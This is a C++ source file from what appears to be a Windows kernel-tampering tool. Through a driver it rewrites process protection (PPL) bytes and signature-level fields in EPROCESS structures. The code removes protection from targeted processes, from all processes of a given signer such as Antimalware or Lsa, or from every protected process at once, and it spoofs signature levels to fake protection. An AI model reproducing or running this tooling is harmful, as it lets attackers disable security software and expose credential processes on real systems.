// ProcessProtection.cpp
// Kernel-level process protection manipulation.
//
// Exposes three protection verbs — Protect, Unprotect, SetProtection —
// each available in single-target, by-name, by-signer, and batch forms.
// All paths that touch the driver acquire a session through
// BeginDriverSession / EndDriverSession; batch variants hold a single
// session across the whole loop rather than opening and closing per-PID.
//
// Signature spoofing is applied automatically whenever protection is set,
// so that the fake protection level is reflected in user-mode checks too.

#include "Controller.h"
#include "common.h"
#include "Utils.h"
#include <unordered_map>

extern volatile bool g_interrupted;

// ── Signature level selection ────────────────────────────────────────────────

// Returns the SignatureLevel / SectionSignatureLevel bytes that best match a
// given signer type, based on empirical observations of protected Windows
// components. The exact values are OS-version-dependent; these are reasonable
// defaults that work across Windows 10/11.
static void GetOptimalSpoofSignatures(UCHAR signerType,
                                       UCHAR& outExeSig,
                                       UCHAR& outDllSig) noexcept
{
    switch (static_cast<PS_PROTECTED_SIGNER>(signerType)) {
    case PS_PROTECTED_SIGNER::Antimalware:
        outExeSig = 0x37; // WinSystem
        outDllSig = 0x07; // WinSystem
        break;
    case PS_PROTECTED_SIGNER::Windows:
    case PS_PROTECTED_SIGNER::WinTcb:
    case PS_PROTECTED_SIGNER::WinSystem:
        outExeSig = 0x3E; // Critical
        outDllSig = 0x0C; // Standard
        break;
    case PS_PROTECTED_SIGNER::Lsa:
        outExeSig = 0x3C; // Service
        outDllSig = 0x08; // Authenticode
        break;
    default:
        outExeSig = 0x08; // Authenticode
        outDllSig = 0x08;
        break;
    }
}

// Applies protection + matching signature levels to a single EPROCESS address.
// Called by all Protect* and SetProtection* paths after the protection byte
// has been determined.
static void ApplyProtectionWithSignatures(Controller* ctrl,
                                           ULONG_PTR kernelAddr,
                                           UCHAR newProtection,
                                           UCHAR signerType) noexcept
{
    ctrl->SetProcessProtection(kernelAddr, newProtection);

    UCHAR exeSig = 0, dllSig = 0;
    GetOptimalSpoofSignatures(signerType, exeSig, dllSig);
    ctrl->SetProcessSignatures(kernelAddr, exeSig, dllSig);
}

// ── Single-target operations ─────────────────────────────────────────────────

// Protects a process with the given level and signer.
// Fails if the process is already protected (use SetProcessProtection to
// overwrite an existing protection regardless of current state).
bool Controller::ProtectProcess(DWORD pid,
                                 const std::wstring& protectionLevel,
                                 const std::wstring& signerType) noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    const auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr)       { EndDriverSession(true); return false; }

    if (const auto prot = GetProcessProtection(kernelAddr.value());
        prot && prot.value() > 0)
    {
        ERROR(L"PID %d is already protected", pid);
        EndDriverSession(true);
        return false;
    }

    const auto level  = Utils::GetProtectionLevelFromString(protectionLevel);
    const auto signer = Utils::GetSignerTypeFromString(signerType);
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type");
        EndDriverSession(true);
        return false;
    }

    const UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    ApplyProtectionWithSignatures(this, kernelAddr.value(),
                                   newProtection, signer.value());

    SUCCESS(L"Protected PID %d with %s-%s",
            pid, protectionLevel.c_str(), signerType.c_str());
    EndDriverSession(true);
    return true;
}

// Removes protection from a process.
// Fails if the process is not currently protected.
bool Controller::UnprotectProcess(DWORD pid) noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    const auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr)       { EndDriverSession(true); return false; }

    const auto currentProtection = GetProcessProtection(kernelAddr.value());
    if (!currentProtection || currentProtection.value() == 0) {
        ERROR(L"PID %d is not protected", pid);
        EndDriverSession(true);
        return false;
    }

    if (!SetProcessProtection(kernelAddr.value(), 0)) {
        ERROR(L"Failed to remove protection from PID %d", pid);
        EndDriverSession(true);
        return false;
    }

    SUCCESS(L"Removed protection from PID %d", pid);
    EndDriverSession(true);
    return true;
}

// Overwrites the protection of a process regardless of its current state.
bool Controller::SetProcessProtection(DWORD pid,
                                       const std::wstring& protectionLevel,
                                       const std::wstring& signerType) noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    const auto level  = Utils::GetProtectionLevelFromString(protectionLevel);
    const auto signer = Utils::GetSignerTypeFromString(signerType);
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type");
        EndDriverSession(true);
        return false;
    }

    const auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) { EndDriverSession(true); return false; }

    const UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    ApplyProtectionWithSignatures(this, kernelAddr.value(),
                                   newProtection, signer.value());

    SUCCESS(L"Set protection %s-%s on PID %d",
            protectionLevel.c_str(), signerType.c_str(), pid);
    EndDriverSession(true);
    return true;
}

// ── Name-based single-target wrappers ────────────────────────────────────────
// These resolve the name with Toolhelp32 only (no driver) and delegate to the
// PID-based functions above.

bool Controller::ProtectProcessByName(const std::wstring& processName,
                                       const std::wstring& protectionLevel,
                                       const std::wstring& signerType) noexcept
{
    const auto match = ResolveNameWithoutDriver(processName);
    return match && ProtectProcess(match->Pid, protectionLevel, signerType);
}

bool Controller::UnprotectProcessByName(const std::wstring& processName) noexcept
{
    const auto match = ResolveNameWithoutDriver(processName);
    return match && UnprotectProcess(match->Pid);
}

bool Controller::SetProcessProtectionByName(const std::wstring& processName,
                                              const std::wstring& protectionLevel,
                                              const std::wstring& signerType) noexcept
{
    const auto match = ResolveNameWithoutDriver(processName);
    return match && SetProcessProtection(match->Pid, protectionLevel, signerType);
}

// ── Internal single-step helpers (used by batch loops) ───────────────────────

// Protects a single PID; skips already-protected processes.
// Pass insideBatchSession=true to skip session management (caller holds it).
bool Controller::ProtectProcessInternal(DWORD pid,
                                         const std::wstring& protectionLevel,
                                         const std::wstring& signerType,
                                         bool insideBatchSession) noexcept
{
    if (!insideBatchSession && !BeginDriverSession()) {
        EndDriverSession(true); return false;
    }

    const auto level  = Utils::GetProtectionLevelFromString(protectionLevel);
    const auto signer = Utils::GetSignerTypeFromString(signerType);
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type for PID %d", pid);
        if (!insideBatchSession) EndDriverSession(true);
        return false;
    }

    const auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) {
        if (!insideBatchSession) EndDriverSession(true);
        return false;
    }

    if (const auto current = GetProcessProtection(kernelAddr.value());
        current && current.value() > 0)
    {
        INFO(L"PID %d already protected, skipping", pid);
        if (!insideBatchSession) EndDriverSession(true);
        return false;
    }

    const UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    if (SetProcessProtection(kernelAddr.value(), newProtection)) {
        UCHAR exeSig = 0, dllSig = 0;
        GetOptimalSpoofSignatures(signer.value(), exeSig, dllSig);
        SetProcessSignatures(kernelAddr.value(), exeSig, dllSig);
        SUCCESS(L"Protected PID %d with %s-%s",
                pid, protectionLevel.c_str(), signerType.c_str());
        if (!insideBatchSession) EndDriverSession(true);
        return true;
    }

    ERROR(L"Failed to protect PID %d", pid);
    if (!insideBatchSession) EndDriverSession(true);
    return false;
}

// Sets protection on a single PID, always overwriting any existing value.
// Pass insideBatchSession=true to skip session management (caller holds it).
bool Controller::SetProcessProtectionInternal(DWORD pid,
                                               const std::wstring& protectionLevel,
                                               const std::wstring& signerType,
                                               bool insideBatchSession) noexcept
{
    if (!insideBatchSession && !BeginDriverSession()) {
        EndDriverSession(true); return false;
    }

    const auto level  = Utils::GetProtectionLevelFromString(protectionLevel);
    const auto signer = Utils::GetSignerTypeFromString(signerType);
    if (!level || !signer) {
        ERROR(L"Invalid protection level or signer type for PID %d", pid);
        if (!insideBatchSession) EndDriverSession(true);
        return false;
    }

    const auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) {
        if (!insideBatchSession) EndDriverSession(true);
        return false;
    }

    const UCHAR newProtection = Utils::GetProtection(level.value(), signer.value());
    if (SetProcessProtection(kernelAddr.value(), newProtection)) {
        UCHAR exeSig = 0, dllSig = 0;
        GetOptimalSpoofSignatures(signer.value(), exeSig, dllSig);
        SetProcessSignatures(kernelAddr.value(), exeSig, dllSig);
        SUCCESS(L"Set protection %s-%s on PID %d",
                protectionLevel.c_str(), signerType.c_str(), pid);
        if (!insideBatchSession) EndDriverSession(true);
        return true;
    }

    ERROR(L"Failed to set protection on PID %d", pid);
    if (!insideBatchSession) EndDriverSession(true);
    return false;
}

// ── Batch protect / set / unprotect ─────────────────────────────────────────

// Resolves a list of PID/name targets to a deduplicated PID vector.
// Uses the already-open driver session for name→kernel resolution.
static std::vector<DWORD> ResolveTargetsToPids(
    Controller* ctrl,
    const std::vector<std::wstring>& targets) noexcept
{
    std::vector<DWORD> pids;
    for (const auto& target : targets) {
        if (Utils::IsNumeric(target)) {
            if (const auto pid = Utils::ParsePid(target))
                pids.push_back(pid.value());
        } else {
            for (const auto& match : ctrl->FindProcessesByName(target))
                pids.push_back(match.Pid);
        }
    }
    return pids;
}

bool Controller::ProtectMultipleProcesses(
    const std::vector<std::wstring>& targets,
    const std::wstring& protectionLevel,
    const std::wstring& signerType) noexcept
{
    if (targets.empty()) { ERROR(L"No targets provided"); return false; }
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    if (!Utils::GetProtectionLevelFromString(protectionLevel) ||
        !Utils::GetSignerTypeFromString(signerType))
    {
        ERROR(L"Invalid protection level or signer type");
        EndDriverSession(true);
        return false;
    }

    const auto pids = ResolveTargetsToPids(this, targets);
    if (pids.empty()) {
        ERROR(L"No processes found matching the specified targets");
        EndDriverSession(true);
        return false;
    }

    INFO(L"Batch protect: %zu resolved processes", pids.size());
    DWORD successCount = 0;
    for (DWORD pid : pids) {
        if (g_interrupted) { INFO(L"Batch operation interrupted"); break; }
        if (ProtectProcessInternal(pid, protectionLevel, signerType,
                                    /*insideBatchSession=*/true))
            ++successCount;
    }

    EndDriverSession(true);
    INFO(L"Batch protect completed: %d/%zu", successCount, pids.size());
    return successCount > 0;
}

bool Controller::SetMultipleProcessesProtection(
    const std::vector<std::wstring>& targets,
    const std::wstring& protectionLevel,
    const std::wstring& signerType) noexcept
{
    if (targets.empty()) { ERROR(L"No targets provided"); return false; }
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    if (!Utils::GetProtectionLevelFromString(protectionLevel) ||
        !Utils::GetSignerTypeFromString(signerType))
    {
        ERROR(L"Invalid protection level or signer type");
        EndDriverSession(true);
        return false;
    }

    const auto pids = ResolveTargetsToPids(this, targets);
    if (pids.empty()) {
        ERROR(L"No processes found matching the specified targets");
        EndDriverSession(true);
        return false;
    }

    INFO(L"Batch set: %zu resolved processes", pids.size());
    DWORD successCount = 0;
    for (DWORD pid : pids) {
        if (g_interrupted) { INFO(L"Batch operation interrupted"); break; }
        if (SetProcessProtectionInternal(pid, protectionLevel, signerType,
                                          /*insideBatchSession=*/true))
            ++successCount;
    }

    EndDriverSession(true);
    INFO(L"Batch set completed: %d/%zu", successCount, pids.size());
    return successCount > 0;
}

// Returns true only if ALL targets were successfully unprotected.
bool Controller::UnprotectMultipleProcesses(
    const std::vector<std::wstring>& targets) noexcept
{
    if (targets.empty()) return false;
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    const DWORD total = static_cast<DWORD>(targets.size());
    DWORD successCount = 0;

    for (const auto& target : targets) {
        if (g_interrupted) break;

        bool ok = false;
        if (Utils::IsNumeric(target)) {
            try {
                ok = UnprotectProcess(static_cast<DWORD>(std::stoul(target)));
            } catch (...) {
                ERROR(L"Invalid PID: %s", target.c_str());
            }
        } else {
            ok = UnprotectProcessByName(target);
        }
        if (ok) ++successCount;
    }

    INFO(L"Batch unprotect: %d/%d targets processed", successCount, total);
    EndDriverSession(true);
    return successCount == total;
}

// ── Signer-based batch operations ────────────────────────────────────────────

// Removes protection from all processes carrying a specific signer.
// Saves the affected process list via SessionManager so it can be restored.
bool Controller::UnprotectBySigner(const std::wstring& signerName) noexcept
{
    const auto signerType = Utils::GetSignerTypeFromString(signerName);
    if (!signerType) {
        ERROR(L"Invalid signer type: %s", signerName.c_str());
        return false;
    }

    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    std::vector<ProcessEntry> affected;
    for (const auto& entry : GetProcessList()) {
        if (entry.ProtectionLevel > 0 && entry.SignerType == signerType.value())
            affected.push_back(entry);
    }

    if (affected.empty()) {
        INFO(L"No protected processes found with signer: %s", signerName.c_str());
        EndDriverSession(true);
        return false;
    }

    INFO(L"Batch unprotect by signer '%s': %zu processes",
         signerName.c_str(), affected.size());
    m_sessionMgr.SaveUnprotectOperation(signerName, affected);

    DWORD successCount = 0;
    for (const auto& entry : affected) {
        if (g_interrupted) { INFO(L"Batch operation interrupted"); break; }
        if (SetProcessProtection(entry.KernelAddress, 0)) {
            ++successCount;
            SUCCESS(L"Removed protection from PID %d (%s)",
                    entry.Pid, entry.ProcessName.c_str());
        } else {
            ERROR(L"Failed to remove protection from PID %d (%s)",
                  entry.Pid, entry.ProcessName.c_str());
        }
    }

    INFO(L"Batch unprotect by signer completed: %d/%zu",
         successCount, affected.size());
    EndDriverSession(true);
    return successCount > 0;
}

// Sets a new protection level/signer for all processes that currently carry
// the given signer type.
bool Controller::SetProtectionBySigner(const std::wstring& currentSigner,
                                        const std::wstring& level,
                                        const std::wstring& newSigner) noexcept
{
    const auto currentSignerType = Utils::GetSignerTypeFromString(currentSigner);
    const auto newSignerType     = Utils::GetSignerTypeFromString(newSigner);
    const auto protectionLevel   = Utils::GetProtectionLevelFromString(level);

    if (!currentSignerType) {
        ERROR(L"Invalid current signer type: %s", currentSigner.c_str()); return false;
    }
    if (!newSignerType) {
        ERROR(L"Invalid new signer type: %s", newSigner.c_str()); return false;
    }
    if (!protectionLevel) {
        ERROR(L"Invalid protection level: %s", level.c_str()); return false;
    }

    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    std::vector<ProcessEntry> targets;
    for (const auto& entry : GetProcessList()) {
        if (entry.SignerType == currentSignerType.value())
            targets.push_back(entry);
    }

    if (targets.empty()) {
        INFO(L"No processes found with signer: %s", currentSigner.c_str());
        EndDriverSession(true);
        return false;
    }

    INFO(L"Setting protection for %zu processes (signer: %s → %s %s)",
         targets.size(), currentSigner.c_str(), level.c_str(), newSigner.c_str());

    const UCHAR newProtection =
        (static_cast<UCHAR>(newSignerType.value()) << 4) |
         static_cast<UCHAR>(protectionLevel.value());

    DWORD successCount = 0;
    for (const auto& entry : targets) {
        if (g_interrupted) { INFO(L"Operation interrupted"); break; }
        if (SetProcessProtection(entry.KernelAddress, newProtection)) {
            ++successCount;
            SUCCESS(L"Set protection for PID %d (%s): %s-%s",
                    entry.Pid, entry.ProcessName.c_str(),
                    level.c_str(), newSigner.c_str());
        } else {
            ERROR(L"Failed to set protection for PID %d (%s)",
                  entry.Pid, entry.ProcessName.c_str());
        }
    }

    INFO(L"Batch by signer completed: %d/%zu", successCount, targets.size());
    EndDriverSession(true);
    return successCount > 0;
}

// Removes protection from every protected process, grouped by signer.
// Each signer group is saved to SessionManager for later restoration.
bool Controller::UnprotectAllProcesses() noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    std::unordered_map<std::wstring, std::vector<ProcessEntry>> groups;
    for (const auto& entry : GetProcessList()) {
        if (entry.ProtectionLevel > 0)
            groups[Utils::GetSignerTypeAsString(entry.SignerType)].push_back(entry);
    }

    if (groups.empty()) {
        INFO(L"No protected processes found");
        EndDriverSession(true);
        return false;
    }

    INFO(L"Mass unprotect: %zu signer groups", groups.size());
    DWORD totalSuccess = 0, totalProcessed = 0;

    for (const auto& [signerName, group] : groups) {
        if (g_interrupted) break;
        INFO(L"Processing signer group: %s (%zu processes)",
             signerName.c_str(), group.size());
        m_sessionMgr.SaveUnprotectOperation(signerName, group);

        for (const auto& entry : group) {
            if (g_interrupted) break;
            ++totalProcessed;
            if (SetProcessProtection(entry.KernelAddress, 0)) {
                ++totalSuccess;
                SUCCESS(L"Removed protection from PID %d (%s)",
                        entry.Pid, entry.ProcessName.c_str());
            } else {
                ERROR(L"Failed to remove protection from PID %d (%s)",
                      entry.Pid, entry.ProcessName.c_str());
            }
        }
    }

    if (g_interrupted) INFO(L"Mass unprotect interrupted by user");
    INFO(L"Mass unprotect completed: %d/%d", totalSuccess, totalProcessed);
    EndDriverSession(true);
    return totalSuccess > 0;
}

// ── Session state restoration ────────────────────────────────────────────────

bool Controller::RestoreProtectionBySigner(const std::wstring& signerName) noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }
    const bool ok = m_sessionMgr.RestoreBySigner(signerName, this);
    EndDriverSession(true);
    // If the target process was killed rather than unprotected, attempt relaunch.
    return ok || TryRelaunchKilledProcess(signerName);
}

bool Controller::RestoreAllProtection() noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }
    const bool ok = m_sessionMgr.RestoreAll(this);
    EndDriverSession(true);
    return ok;
}

void Controller::ShowSessionHistory() noexcept
{
    m_sessionMgr.ShowHistory();
}

// ── Signature spoofing ───────────────────────────────────────────────────────

// Directly overwrites SignatureLevel and SectionSignatureLevel for a PID.
// Use when you need fine-grained control beyond the automatic spoofing that
// accompanies protection changes.
bool Controller::SpoofProcessSignatures(DWORD pid,
                                         UCHAR exeSig,
                                         UCHAR dllSig) noexcept
{
    if (!BeginDriverSession()) { EndDriverSession(true); return false; }

    const auto kernelAddr = GetCachedKernelAddress(pid);
    if (!kernelAddr) { EndDriverSession(true); return false; }

    if (!SetProcessSignatures(kernelAddr.value(), exeSig, dllSig)) {
        ERROR(L"Failed to spoof signatures on PID %d", pid);
        EndDriverSession(true);
        return false;
    }

    SUCCESS(L"Spoofed signatures on PID %d: EXE=0x%02X DLL=0x%02X",
            pid, exeSig, dllSig);
    EndDriverSession(true);
    return true;
}

bool Controller::SpoofProcessSignaturesByName(const std::wstring& processName,
                                               UCHAR exeSig,
                                               UCHAR dllSig) noexcept
{
    const auto match = ResolveNameWithoutDriver(processName);
    return match && SpoofProcessSignatures(match->Pid, exeSig, dllSig);
}
